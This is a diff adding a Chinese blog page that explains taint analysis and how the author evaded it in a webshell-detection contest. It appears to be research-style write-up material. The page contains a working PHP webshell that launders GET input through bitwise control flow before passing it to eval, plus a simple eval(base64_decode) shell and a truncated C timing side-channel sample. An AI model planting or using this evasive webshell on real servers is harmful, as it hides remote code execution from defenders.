@@ -1,0 +1,1147 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.18">
+    
+    
+      
+        <title>PHP-WebShell绕过污点分析 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.26e3688c.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="red">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  <img src="../../static/image.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PHP-WebShell绕过污点分析
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+            
+              <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+              </label>
+            
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+            
+              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+              </label>
+            
+          
+        </form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Tee/" class="md-tabs__link">
+        TEE
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Os/" class="md-tabs__link">
+        OS
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link md-tabs__link--active">
+        Security
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  <img src="../../static/image.jpg" alt="logo">
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+          TEE
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          TEE
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tee/" class="md-nav__link">
+        TEE 论文note
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tee/SEV-Memory-Secure/" class="md-nav__link">
+        SEV Memory Secure
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          OS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          OS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Os/" class="md-nav__link">
+        OS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          Security
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Security
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        Security
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          PHP-WebShell绕过污点分析
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        PHP-WebShell绕过污点分析
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    污点分析
+  </a>
+  
+    <nav class="md-nav" aria-label="污点分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    例子一
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    绕过污点分析
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过污点分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#antihybrid" class="md-nav__link">
+    AntiHybrid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    侧信道
+  </a>
+  
+    <nav class="md-nav" aria-label="侧信道">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    时间侧信道
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#microtime" class="md-nav__link">
+    microtime
+  </a>
+  
+    <nav class="md-nav" aria-label="microtime">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    测试情况
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    内存侧信道
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    最后
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    污点分析
+  </a>
+  
+    <nav class="md-nav" aria-label="污点分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    例子一
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    绕过污点分析
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过污点分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#antihybrid" class="md-nav__link">
+    AntiHybrid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    侧信道
+  </a>
+  
+    <nav class="md-nav" aria-label="侧信道">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    时间侧信道
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#microtime" class="md-nav__link">
+    microtime
+  </a>
+  
+    <nav class="md-nav" aria-label="microtime">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    测试情况
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    内存侧信道
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    最后
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>PHP-WebShell绕过污点分析</h1>
+
+<h2 id="_1">前言<a class="headerlink" href="#_1" title="Permanent link">*</a></h2>
+<p>阿里的伏魔活动绕WebShell结束了，交了18个，重复了12个。。不得不说，太卷了哈哈哈。写一下两个自己感觉比较有意思的绕过思路。</p>
+<h2 id="_2">污点分析<a class="headerlink" href="#_2" title="Permanent link">*</a></h2>
+<p>先谈谈什么是污点分析，这是一项非常老的技术。
+污点分析是一种跟踪并且分析污点信息在程序中流动的技术。在漏洞分析的过程中，污点分析会将所有来自程序外部输入都标记成污点数据，然后跟踪和污点数据相关的信息流向，观察是否流向被定义好的sink点。</p>
+<h3 id="_3">例子一<a class="headerlink" href="#_3" title="Permanent link">*</a></h3>
+<p><div class="highlight"><pre><span></span><code><span class="x">#demo.php</span>
+<span class="cp">&lt;?php</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span><span class="c1">// source点，通过GET输入的数据会标记成污点信息</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="c1">//变量$b被$a污染了</span>
+    <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="c1">// sink,污点$b传到了eval处。</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+如何通过代码去检测说明这个流程呢？
+使用php-parse成ast的例子，可以清晰的看到变量的由来和去处，以及传递覆盖的过程
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>php<span class="w"> </span>.<span class="se">\d</span>emo.php
+string<span class="o">(</span><span class="m">1166</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;array(</span>
+<span class="s2">    0: Stmt_Expression(</span>
+<span class="s2">        expr: Expr_Assign(</span>
+<span class="s2">            var: Expr_Variable(</span>
+<span class="s2">                name: a //source</span>
+<span class="s2">            )</span>
+<span class="s2">            expr: Expr_ArrayDimFetch(</span>
+<span class="s2">                var: Expr_Variable(</span>
+<span class="s2">                    name: _GET</span>
+<span class="s2">                )</span>
+<span class="s2">                dim: Scalar_String(</span>
+<span class="s2">                    value: a</span>
+<span class="s2">                )</span>
+<span class="s2">            )</span>
+<span class="s2">        )</span>
+<span class="s2">    )</span>
+<span class="s2">    1: Stmt_Expression(</span>
+<span class="s2">        expr: Expr_Assign(</span>
+<span class="s2">            var: Expr_Variable(</span>
+<span class="s2">                name: b</span>
+<span class="s2">            )</span>
+<span class="s2">            expr: Expr_FuncCall(</span>
+<span class="s2">                name: Name(</span>
+<span class="s2">                    parts: array(</span>
+<span class="s2">                        0: base64_decode</span>
+<span class="s2">                    )</span>
+<span class="s2">                )</span>
+<span class="s2">                args: array(</span>
+<span class="s2">                    0: Arg(</span>
+<span class="s2">                        name: null</span>
+<span class="s2">                        value: Expr_Variable(</span>
+<span class="s2">                            name: a //source</span>
+<span class="s2">                        )</span>
+<span class="s2">                        byRef: false</span>
+<span class="s2">                        unpack: false</span>
+<span class="s2">                    )</span>
+<span class="s2">                )</span>
+<span class="s2">            )</span>
+<span class="s2">        )</span>
+<span class="s2">    )</span>
+<span class="s2">    2: Stmt_Expression(</span>
+<span class="s2">        expr: Expr_Eval(</span>
+<span class="s2">            expr: Expr_Variable(</span>
+<span class="s2">                name: b //source</span>
+<span class="s2">            )</span>
+<span class="s2">        )</span>
+<span class="s2">    )</span>
+<span class="s2">    3: Stmt_Nop(</span>
+<span class="s2">    )</span>
+<span class="s2">)&quot;</span>
+</code></pre></div>
+上面仅仅是一个简单的，抽象AST的例子，真正污点分析还需要做很多工程。</p>
+<p><img alt="image-20220210161709118" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210161709118.png" />
+譬如需要先**对PHP程序分词**，生成AST(抽象语法树)，<strong>进而在AST的基础上进行PHP的语法和词法分析</strong>，得到富有语义的IR中间代码，然后精确地字符串分析提取函数摘要，并创建CFG。其中函数摘要的准确性和CFG的完整性，保证了污点分析的准确性和效率。
+污点分析阶段在前一阶段的基础上通过**变量回溯**的方法提取有效路径，将无关的路径“剪枝”，判断用户输入到达敏感点的路径上是否经过了有效的过滤，进而判断是否存在漏洞。</p>
+<p>这些工作，需要对编译技术了解的十分透彻，而我的编程功底实在有限，无法自己写一个污点分析的最小化引擎。</p>
+<h2 id="_4">绕过污点分析<a class="headerlink" href="#_4" title="Permanent link">*</a></h2>
+<p>上面知识我们知道，污点分析跟踪观察的是source到sink的这个途径，那么可不可以把这条路径给隐藏呢？</p>
+<h3 id="antihybrid">AntiHybrid<a class="headerlink" href="#antihybrid" title="Permanent link">*</a></h3>
+<p>这个技巧是读论文学到的，这是一篇Usenix顶刊论文，作者为release版本的软件尽可能的阻止攻击者进行Fuzzing，提高hacker fuzz的难度和成本，提出了三条Fuzzification 的技术：
+​</p>
+<ol>
+<li>SpeedBump, which amplifies the slowdown in normal executions by hundreds of times to the fuzzed execution   在一些非预期的错误处理路径注入延迟原语，影响Fuzz执行速度 </li>
+<li>BranchTrap, interfering with feedback logic by hiding paths and polluting coverage maps。
+插入大量对输入敏感的分支，使得Fuzz处理不得不浪费大量的资源处理这些无用的分支分析中 </li>
+<li>AntiHybrid, hindering taint-analysis and symbolic execution。
+作者将原始程序中的explicit data-flow转换为implicit data-flow，以阻碍污染分析。 </li>
+</ol>
+<p>下面重点介绍AntiHybrid的思路。</p>
+<p>这是作者演讲的slide。为了抵抗dta，新建了一个anti_dta的变量，该变量根据source调节控制动态的赋值，借助于此，两个变量变得毫无关系，从而污点从input隐蔽转换到anti_data中。</p>
+<p><img alt="image-20220210162720966" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162720966.png" /></p>
+<p>下面是作者给出的antiHybrid的代码思路
+<img alt="image-20220210162731792" src="https://raw.githubusercontent.com/pw0rld/blog_image/master/image-20220210162731792.png" />
+其中6-15行是核心，12行是if条件控制，隐蔽的把数据传到了ch变量。因此我们把这个思想搬运到这次的比赛中，譬如以下。</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+<span class="nv">$cha</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;chr&#39;</span><span class="p">];</span>
+<span class="nv">$bbb</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="nv">$ch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="nv">$temps</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="nv">$temps2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="nv">$kkkk</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="nv">$temps</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$temp</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span><span class="c1">//source</span>
+    <span class="nv">$temps2</span> <span class="o">=</span> <span class="nv">$temps</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$j</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$temps2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span><span class="c1">//source</span>
+    <span class="p">{</span>
+      <span class="nv">$ch</span> <span class="o">|=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="nv">$j</span><span class="p">;</span><span class="c1">//source</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="nv">$bbb</span> <span class="o">.=</span> <span class="nv">$cha</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span><span class="c1">//source</span>
+<span class="p">}</span>
+<span class="k">eval</span><span class="p">(</span><span class="nv">$bbb</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<h3 id="_5">侧信道<a class="headerlink" href="#_5" title="Permanent link">*</a></h3>
+<p>侧信道攻击——是一种利用计算机不经意间释放出的信息信号（如功耗,电磁辐射，电脑硬件运行声）来进行破译的攻击模式。我更愿意将它视为一种思想，如何利用借助环境信息来推导出你想要的信息。下面我将使用一个简单的C语言程序说明一下时间侧信道如何发生。</p>
+<h4 id="_6">时间侧信道<a class="headerlink" href="#_6" title="Permanent link">*</a></h4>
+<p>这个例子是当时学习SGX侧信道的例子，对侧信道感兴趣的小伙伴可以自己把余下几个侧信道给做了。其中包括如何利用Page fault、flush-and-reload等等方法来侧信道攻击获取信息。
+<a href="https://github.com/jovanbulck/sgx-tutorial-space18">https://github.com/jovanbulck/sgx-tutorial-space18</a>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cacheutils.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;secret.h&quot;</span>
+
+<span class="cp">#define NUM_SAMPLES     100000</span>
+<span class="cp">#define DELAY           1</span>
+
+<span class="kt">uint64_t</span><span class="w"> </span><span class="n">diff</span><span class="p">[</span><span class="n">NUM_SAMPLES</span><span class="p">];</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">user_len</span><span class="p">,</span><span class="w"> </span><span class="n">secret_len</span><span class="p">;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">read_from_user</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="c1">//提供读写给用户</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter super secret password (&#39;q&#39; to exit): &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">len</span><span class="o">=</span><span class="n">getline</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">buffer</span><span class="p">[</span><span class="n">len</span><span class="mi">-1</span><span class="p">]</span><span class="o">=</span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;--&gt; You entered: &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">buffer</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">else</span>
+<span class="w">    </span><span class="p">{</span>
